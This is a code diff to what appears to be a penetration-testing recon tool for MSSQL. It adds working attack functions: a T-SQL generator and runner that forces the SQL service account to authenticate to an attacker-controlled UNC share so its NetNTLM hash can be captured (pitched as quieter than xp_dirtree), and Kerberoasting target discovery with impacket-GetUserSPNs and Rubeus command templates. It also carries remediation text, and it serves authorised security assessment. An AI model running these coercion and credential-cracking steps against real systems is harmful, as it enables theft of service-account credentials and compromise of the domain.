@@ -583,6 +583,70 @@ def ntlm_info(ip: str, port: int = _DEFAULT_PORT, timeout: float = 4.0) -> dict:
     return out
 
 
+# --- Kerberos SPN (MSSQLSvc) for kerberoasting ----------------------------------
+
+def kerberoast_spn(ntlm: dict, port: int = _DEFAULT_PORT,
+                   instance: str = "") -> str:
+    """Compute the MSSQLSvc Service Principal Name a domain user can request
+    a TGS for. Per MS-KILE (and the SQL Server BOL page 'Register a Service
+    Principal Name for Kerberos Connections') the SPN is
+    'MSSQLSvc/<fqdn>:<port>' for the default TCP endpoint or
+    'MSSQLSvc/<fqdn>:<instance>' for a named instance. Returns '' when the
+    pre-auth NTLM leak did not surface a fully-qualified DNS computer name
+    (e.g. instance is not AD-joined, or NTLM leak failed)."""
+    fqdn = (ntlm or {}).get("dns_computer") or ""
+    if not fqdn:
+        return ""
+    tail = instance or str(port or _DEFAULT_PORT)
+    return f"MSSQLSvc/{fqdn}:{tail}"
+
+
+# --- BACKUP-to-UNC coercion (NetNTLM capture, needs only BACKUP DATABASE) -------
+
+def build_backup_unc_script(lhost: str, share: str = "recce") -> str:
+    """T-SQL that coerces the SQL service account to authenticate to
+    \\\\<lhost>\\<share> via BACKUP DATABASE / RESTORE VERIFYONLY - an
+    alternative NetNTLM coercion to xp_dirtree that only needs the BACKUP
+    DATABASE permission on master (not sysadmin, not xp_cmdshell, not any
+    xp_ extended-procedure grant).
+
+    Wrapped in TRY/CATCH because the target is an attacker share, not a real
+    backup destination; the coercion happens during the SMB connection
+    attempt before the failure is reported to SQL Server."""
+    # Strip characters that would break the T-SQL string literal or the UNC
+    # path; the coercion works with a bare host/share.
+    l = (lhost or "").replace("'", "").replace("\\", "")
+    s = (share or "recce").replace("'", "").replace("\\", "") or "recce"
+    path = f"\\\\{l}\\{s}\\recce_backup.bak"
+    return (
+        "BEGIN TRY "
+        f"BACKUP DATABASE master TO DISK = '{path}' WITH INIT, NOFORMAT "
+        "END TRY BEGIN CATCH SELECT 'coerced|'+ERROR_MESSAGE() END CATCH\n"
+        "BEGIN TRY "
+        f"RESTORE VERIFYONLY FROM DISK = '{path}' "
+        "END TRY BEGIN CATCH SELECT 'coerced|'+ERROR_MESSAGE() END CATCH\n"
+        "exit\n"
+    )
+
+
+def run_backup_unc(ip: str, creds: dict, lhost: str, port: int = _DEFAULT_PORT,
+                   windows_auth: bool = True) -> tuple[bool, str | None]:
+    """Trigger the SQL service account to authenticate to `lhost` via
+    BACKUP DATABASE / RESTORE VERIFYONLY - a stealthier alternative to
+    xp_dirtree that only needs BACKUP DATABASE. Returns (triggered, error).
+
+    The BACKUP itself fails because the destination is an attacker share; the
+    coercion happens on the outbound SMB connection before the failure is
+    reported. Mirrors `run_xp_dirtree` in signature and behaviour."""
+    cmd = _mssqlclient_cmd(ip, creds, port, windows_auth)
+    if cmd is None:
+        return False, "impacket-mssqlclient not installed"
+    out, err = _run_stdin(cmd, build_backup_unc_script(lhost))
+    if err:
+        return False, err
+    return True, None
+
+
 # --- target discovery -----------------------------------------------------------
 
 def mssql_targets(hosts: list[Host]) -> list[dict]:
@@ -823,6 +887,28 @@ _NARRATIVE = {
         "or cracked offline. Because SQL service accounts are often domain accounts with "
         "broad rights, coercing and relaying one is a high-impact, credential-free-ish "
         "pivot out of the database and into the domain."),
+    "mssql_kerberoastable_spn": (
+        "SQL Server running under a Windows/domain service account registers an "
+        "MSSQLSvc/<fqdn>:<port|instance> Service Principal Name in Active Directory "
+        "(MS-KILE - 'Register a Service Principal Name for Kerberos Connections'). "
+        "Any authenticated domain user - not just an admin - can request a Kerberos "
+        "TGS for that SPN and crack the encrypted portion offline with hashcat mode "
+        "13100 ('Kerberoasting'). When the SQL service account uses a weak password "
+        "the operator recovers it in cleartext without ever authenticating to the "
+        "instance. The SPN is registered regardless of whether SQL logins are exposed "
+        "or TDS encryption is enforced, so this is a nearly-free credential path on "
+        "every AD-integrated instance whose FQDN was leaked pre-auth by the NTLM "
+        "challenge; recovered service-account passwords are also frequently reused."),
+    "mssql_backup_unc_coercion": (
+        "recce coerced the SQL service account to authenticate outbound to an "
+        "attacker-controlled UNC path via `BACKUP DATABASE ... TO DISK = '\\\\host\\...'` "
+        "and `RESTORE VERIFYONLY FROM DISK`. This is an alternative NetNTLM coercion "
+        "to xp_dirtree: it needs only the BACKUP DATABASE permission (not sysadmin, "
+        "not xp_cmdshell, and not any xp_ extended-procedure grant), so a low-priv "
+        "database owner can trigger it. Many environments monitor xp_dirtree and "
+        "extended-procedure calls but do not flag BACKUP-to-UNC, making this a "
+        "quieter relay/capture primitive on top of the same coercion the service "
+        "account gives up."),
 }
 
 
@@ -975,6 +1061,37 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                           "service account's NetNTLM -> relay (impacket-ntlmrelayx)", ctx),
                     "Restrict exposure; require SMB signing + EPA to blunt relay.",
                     ["CWE-200"], kind="ntlm_disclosure"))
+
+            # Kerberos SPN kerberoast target. The pre-auth NTLM leak already
+            # gave us the FQDN of an AD-integrated instance; any authenticated
+            # domain user can request a TGS for MSSQLSvc/<fqdn>:<port> and
+            # crack the service-account password offline (hashcat -m 13100)
+            # regardless of whether SQL logins or encryption are enabled.
+            spn = kerberoast_spn(nt, t.portid) if nt else ""
+            if spn:
+                dom = nt.get("dns_domain") or nt.get("nb_domain") or ""
+                out.append(_finding(
+                    "medium",
+                    "MSSQL registers a Kerberoastable SPN (MSSQLSvc)",
+                    tgt,
+                    f"The instance is AD-integrated (FQDN {nt.get('dns_computer')}"
+                    + (f", domain {dom}" if dom else "")
+                    + f") so it registers the SPN {spn}. Any authenticated domain "
+                    "user can request a Kerberos TGS for that SPN and crack the "
+                    "encrypted portion offline; a weak SQL service-account "
+                    "password falls out in cleartext without ever authenticating "
+                    "to the instance.",
+                    "impacket-GetUserSPNs / Rubeus",
+                    _fill("impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc-ip> "
+                          "-request-user <sqlservice>   "
+                          + f"# or targeted:  Rubeus.exe kerberoast /spn:{spn}",
+                          ctx),
+                    "Use a Managed Service Account (gMSA) for the SQL service, or "
+                    "set a very long (>=25 chars) random password on the SQL "
+                    "service account so the returned TGS is not crackable offline; "
+                    "enforce AES-only Kerberos on the account.",
+                    ["CWE-262", "CWE-522"],
+                    kind="mssql_kerberoastable_spn"))
 
             # TDS login encryption not supported at all -> creds sniffable.
             enc = pl.get("encryption")
